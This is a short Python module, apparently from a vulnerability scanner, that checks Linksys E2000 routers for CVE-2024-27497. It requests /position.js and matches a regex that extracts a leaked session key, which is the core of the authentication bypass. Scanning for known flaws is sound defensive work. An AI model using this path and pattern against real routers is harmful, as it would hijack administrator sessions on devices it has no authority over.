"""Agent Asteroid implementation for CVE-2024-27497"""

import re
from agent import definitions
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Linksys E2000 1.0.06 authentication bypass"
VULNERABILITY_REFERENCE = "CVE-2024-27497"
VULNERABILITY_DESCRIPTION = (
    "Linksys E2000 Ver.1.0.06 build 1 is vulnerable to authentication bypass via the "
    "position.js file."
)
RISK_RATING = "CRITICAL"


class CVE202427497Exploit(webexploit.WebExploit):
    accept_path = "/position.js"
    check_path = "/position.js"
    accept_pattern = re.compile("HSetup.asp")
    match_pattern = re.compile(r'var session_key = ".*";')
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )
